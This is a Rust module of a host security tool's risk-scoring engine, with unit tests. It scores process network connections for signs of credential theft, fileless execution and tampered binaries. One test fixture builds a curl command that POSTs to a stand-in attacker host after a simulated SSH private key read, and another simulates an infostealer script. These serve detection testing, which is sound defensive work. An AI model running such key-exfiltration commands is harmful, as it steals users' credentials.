//! Transparent Deterministic Risk Engine.
//!
//! Evaluates network and execution events in < 1 ms without external dependencies
//! or LLMs, applying deterministic rule weights with LoLBin attack mitigation.

use std::net::IpAddr;
use tracing::debug;

use sentinel_common::config::RulesConfig;
use sentinel_common::process::ProcessNode;
use sentinel_common::risk::{RiskScore, RuleFiring, RuleId};
use crate::lineage::inspect_interpreter;
use crate::pkg_check::DpkgChecker;

/// Context of the network connection event being evaluated.
#[derive(Debug, Clone)]
pub struct NetworkContext {
    pub dest_ip: Option<String>,
    pub dest_port: u16,
    pub has_dns_record: bool,
    pub is_first_seen_ip: bool,
    pub current_time_ns: u64,
    pub is_tofu_tampered: bool,
    pub is_ipc_laundered: bool,
    pub dest_domain: Option<String>,
}

pub struct RiskEngine {
    rules_config: RulesConfig,
    dpkg_checker: DpkgChecker,
}

impl RiskEngine {
    pub fn new(rules_config: RulesConfig, dpkg_checker: DpkgChecker) -> Self {
        Self {
            rules_config,
            dpkg_checker,
        }
    }

    /// Evaluates the risk score of a process attempting a network connection.
    ///
    /// Executes in < 1 ms and returns clamped 0..100 `RiskScore` with hierarchical rules.
    pub fn evaluate(&self, node: &ProcessNode, net: &NetworkContext) -> RiskScore {
        let mut firings = Vec::new();

        // 1. [+50] FILELESS_MEMFD
        if node.is_memfd {
            let weight = self.get_weight(RuleId::FilelessMemfd.as_str(), 50);
            firings.push(RuleFiring {
                rule_id: RuleId::FilelessMemfd,
                weight,
                reason: "Бесфайловое исполнение кода из оперативной памяти (memfd_create)".to_string(),
            });
        }

        // 1b. [+35] FILELESS_ANON_EXEC (Anonymous memory execution or unlinked tmpfs mapping)
        if node.is_anon_exec {
            let weight = self.get_weight(RuleId::FilelessAnonExec.as_str(), 35);
            firings.push(RuleFiring {
                rule_id: RuleId::FilelessAnonExec,
                weight,
                reason: "Исполнение кода из анонимного отображения или удалённого файла tmpfs (mmap PROT_EXEC)".to_string(),
            });
        }

        // 2. [+40] SECRET_NON_OWNER / TAINTED
        let has_secret = !node.secret_accesses.is_empty();
        if has_secret {
            let weight = self.get_weight(RuleId::SecretNonOwner.as_str(), 40);
            firings.push(RuleFiring {
                rule_id: RuleId::SecretNonOwner,
                weight,
                reason: "Чтение защищенного секрета или наследование taint через pipe/FIFO/файл вне App Scope".to_string(),
            });
        }

        // 3. [+15] FAST_EXFIL_BURST (<= 5 seconds after secret access)
        if let Some(last_secret) = node.secret_accesses.last() {
            let delta_ns = net.current_time_ns.saturating_sub(last_secret.timestamp_ns);
            let delta_secs = delta_ns as f64 / 1_000_000_000.0;
            if delta_secs <= 5.0 {
                let weight = self.get_weight(RuleId::FastExfilBurst.as_str(), 15);
                firings.push(RuleFiring {
                    rule_id: RuleId::FastExfilBurst,
                    weight,
                    reason: format!(
                        "Попытка сетевого подключения в течение {:.2} сек после чтения секрета",
                        delta_secs
                    ),
                });
            }
        }

        // 4. [+25] UNTRUSTED_BINARY_ORIGIN
        let target_path = node.script_path.as_deref().unwrap_or(&node.exe_path);
        let path_str = target_path.to_string_lossy();
        let is_untrusted_dir = path_str.starts_with("/tmp")
            || path_str.starts_with("/dev/shm")
            || path_str.contains("/Downloads/")
            || path_str.starts_with("/var/tmp");

        let dpkg_info = self.dpkg_checker.check_package(&node.exe_path);
        let is_verified_package = dpkg_info.as_ref().map(|info| info.is_integrity_verified).unwrap_or(false);

        if is_untrusted_dir || (!is_verified_package && !node.is_interpreter()) {
            let weight = self.get_weight(RuleId::UntrustedBinaryOrigin.as_str(), 25);
            firings.push(RuleFiring {
                rule_id: RuleId::UntrustedBinaryOrigin,
                weight,
                reason: format!("Исполняемый файл/скрипт запущен из ненадежного пути или не верифицирован в dpkg: {}", path_str),
            });
        }

        // 5. [+20] SUSPICIOUS_INTERPRETER
        if let Some(info) = inspect_interpreter(&node.exe_path, &node.cmdline) {
            if info.is_inline || info.is_suspicious_flags {
                let weight = self.get_weight(RuleId::SuspiciousInterpreter.as_str(), 20);
                firings.push(RuleFiring {
                    rule_id: RuleId::SuspiciousInterpreter,
                    weight,
                    reason: "Интерпретатор запущен с inline-кодом, eval, base64 или через pipe".to_string(),
                });
            }

            // 5b. [+25] SUSPICIOUS_SCRIPT_EXECUTION (reading secrets via pipe stdin or inline script)
            if (info.is_inline || info.script_path.is_none()) && has_secret {
                let weight = self.get_weight(RuleId::SuspiciousScriptExecution.as_str(), 25);
                firings.push(RuleFiring {
                    rule_id: RuleId::SuspiciousScriptExecution,
                    weight,
                    reason: "Интерпретатор прочитал секрет при запуске через stdin pipe или inline-скрипт".to_string(),
                });
            }
        }

        // 6. [+15] FIRST_SEEN_DESTINATION (Public IP destination outside RFC1918 / loopback seen first time)
        if let Some(ref ip) = net.dest_ip {
            if !is_private_or_loopback_ip(ip) && net.is_first_seen_ip {
                let weight = self.get_weight(RuleId::FirstSeenDestination.as_str(), 15);
                firings.push(RuleFiring {
                    rule_id: RuleId::FirstSeenDestination,
                    weight,
                    reason: format!("Первое в истории процесса подключение к внешнему публичному IP: {}", ip),
                });
            }
        }

        // 7. [+10] RAW_IP_CONNECT (Direct IP connection without DNS query)
        let is_direct_ip = net.dest_ip.as_ref().map(|ip| is_numeric_ip(ip)).unwrap_or(false);
        if is_direct_ip && !net.has_dns_record {
            let weight = self.get_weight(RuleId::RawIpConnect.as_str(), 10);
            firings.push(RuleFiring {
                rule_id: RuleId::RawIpConnect,
                weight,
                reason: "Сетевое подключение напрямую по IP без зафиксированного DNS-запроса".to_string(),
            });
        }

        // 8. [+40] TOFU_TAMPERED_BINARY (Binary modified after initial Trust-On-First-Use)
        if net.is_tofu_tampered {
            let weight = self.get_weight(RuleId::TofuTamperedBinary.as_str(), 40);
            firings.push(RuleFiring {
                rule_id: RuleId::TofuTamperedBinary,
                weight,
                reason: "Криптографическое несоответствие SHA-256 бинарника в базе TOFU (бинарник был подменён или модифицирован)".to_string(),
            });
        }

        // 9. [+30] IPC_TAINT_LAUNDER (Attempt to transfer/launder secrets via AF_UNIX or ptrace)
        if net.is_ipc_laundered {
            let weight = self.get_weight(RuleId::IpcTaintLaunder.as_str(), 30);
            firings.push(RuleFiring {
                rule_id: RuleId::IpcTaintLaunder,
                weight,
                reason: "Попытка отмывания taint через AF_UNIX сокет или перехват памяти ptrace".to_string(),
            });
        }

        // 10. [-35] TRUSTED_PACKAGE_CONTEXT
        // Legitimate binary in dpkg context, and NOT an interpreter executing an untrusted script,
        // AND ONLY if NO SECRET / TAINT IS PRESENT, and no tampering/laundering detected!
        let is_script_untrusted = node.script_path.is_some() || node.is_memfd || node.is_anon_exec || node.is_interpreter();
        if is_verified_package && !is_untrusted_dir && !is_script_untrusted && !has_secret && !net.is_tofu_tampered && !net.is_ipc_laundered {
            let weight = self.get_weight(RuleId::TrustedPackageContext.as_str(), -35);
            firings.push(RuleFiring {
                rule_id: RuleId::TrustedPackageContext,
                weight,
                reason: "Бинарник верифицирован в пакетах системы (dpkg) с проверкой хеша и запущен в штатном контексте".to_string(),
            });
        }

        let score = RiskScore::compute(firings);
        debug!("Risk evaluation for TGID {}: score={}", node.tgid, score.total);
        score
    }

    fn get_weight(&self, rule_name: &str, default: i32) -> i32 {
        self.rules_config
            .rules
            .get(rule_name)
            .map(|r| r.weight)
            .unwrap_or(default)
    }
}

pub fn is_numeric_ip(s: &str) -> bool {
    s.parse::<IpAddr>().is_ok()
}

pub fn is_private_or_loopback_ip(ip_str: &str) -> bool {
    if let Ok(ip) = ip_str.parse::<IpAddr>() {
        match ip {
            IpAddr::V4(ipv4) => {
                ipv4.is_loopback()
                    || ipv4.is_private()
                    || ipv4.is_link_local()
                    || ipv4.is_broadcast()
            }
            IpAddr::V6(ipv6) => ipv6.is_loopback(),
        }
    } else {
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;
    use sentinel_common::process::SecretCategory;

    #[test]
    fn test_infostealer_detection() {
        let rules = RulesConfig::default();
        let dpkg = DpkgChecker::new();
        let engine = RiskEngine::new(rules, dpkg);

        let mut node = ProcessNode::new(1420, 1000, 1000, PathBuf::from("/usr/bin/python3"));
        node.script_path = Some(PathBuf::from("/tmp/install.py"));
        node.cmdline = vec!["python3".into(), "/tmp/install.py".into()];

        // Accessed SSH key 140ms ago
        node.record_secret_access(
            PathBuf::from("/home/user/.ssh/id_ed25519"),
            SecretCategory::SshKey,
            1_000_000_000,
        );

        let net = NetworkContext {
            dest_ip: Some("185.220.101.5".into()),
            dest_port: 443,
            has_dns_record: false,
            is_first_seen_ip: true,
            current_time_ns: 1_140_000_000,
            is_tofu_tampered: false,
            is_ipc_laundered: false,
            dest_domain: None,
        };

        let score = engine.evaluate(&node, &net);

        // Expected firings:
        // SECRET_NON_OWNER (+40)
        // FAST_EXFIL_BURST (+15)
        // UNTRUSTED_BINARY_ORIGIN (+25)
        // FIRST_SEEN_DESTINATION (+15)
        // RAW_IP_CONNECT (+10)
        // Total = 105 -> clamped to 100 (HIGH)
        assert_eq!(score.total, 100);
        let thresholds = sentinel_common::risk::RiskThresholds::default();
        assert_eq!(score.classify(&thresholds), sentinel_common::risk::Verdict::High);
    }

    #[test]
    fn test_lolbin_curl_exfiltration_retains_grey_verdict() {
        let rules = RulesConfig::default();
        let dpkg = DpkgChecker::new();
        let engine = RiskEngine::new(rules, dpkg);

        // System curl binary (in /usr/bin/curl)
        let mut node = ProcessNode::new(2500, 1000, 1000, PathBuf::from("/usr/bin/curl"));
        node.cmdline = vec!["curl".into(), "-X".into(), "POST".into(), "https://evil.tld".into()];

        // Inherited taint through cat secret | curl pipe
        node.record_secret_access(
            PathBuf::from("/home/user/.ssh/id_rsa"),
            SecretCategory::SshKey,
            1_000_000_000,
        );

        let net = NetworkContext {
            dest_ip: Some("93.184.216.34".into()),
            dest_port: 443,
            has_dns_record: true,
            is_first_seen_ip: false,
            current_time_ns: 20_000_000_000, // 19s delta (> 5s)
            is_tofu_tampered: false,
            is_ipc_laundered: false,
            dest_domain: Some("evil.tld".into()),
        };

        let score = engine.evaluate(&node, &net);

        // SECRET_NON_OWNER (+40)
        // TRUSTED_PACKAGE_CONTEXT (-35) MUST NOT FIRE!
        // Final score must be at least 40 (GREY)
        assert!(score.total >= 40);
        assert!(!score.firings.iter().any(|f| f.rule_id == RuleId::TrustedPackageContext));
        assert_eq!(score.classify(&sentinel_common::risk::RiskThresholds::default()), sentinel_common::risk::Verdict::Grey);
    }

    #[test]
    fn test_tofu_tampered_binary_detection() {
        let rules = RulesConfig::default();
        let dpkg = DpkgChecker::new();
        let engine = RiskEngine::new(rules, dpkg);

        let node = ProcessNode::new(3100, 1000, 1000, PathBuf::from("/home/user/.cargo/bin/tampered_tool"));

        let net = NetworkContext {
            dest_ip: Some("198.51.100.1".into()),
            dest_port: 8080,
            has_dns_record: false,
            is_first_seen_ip: true,
            current_time_ns: 10_000_000_000,
            is_tofu_tampered: true,
            is_ipc_laundered: false,
            dest_domain: None,
        };

        let score = engine.evaluate(&node, &net);
        assert!(score.firings.iter().any(|f| f.rule_id == RuleId::TofuTamperedBinary));
        assert!(score.total >= 40);
    }
}
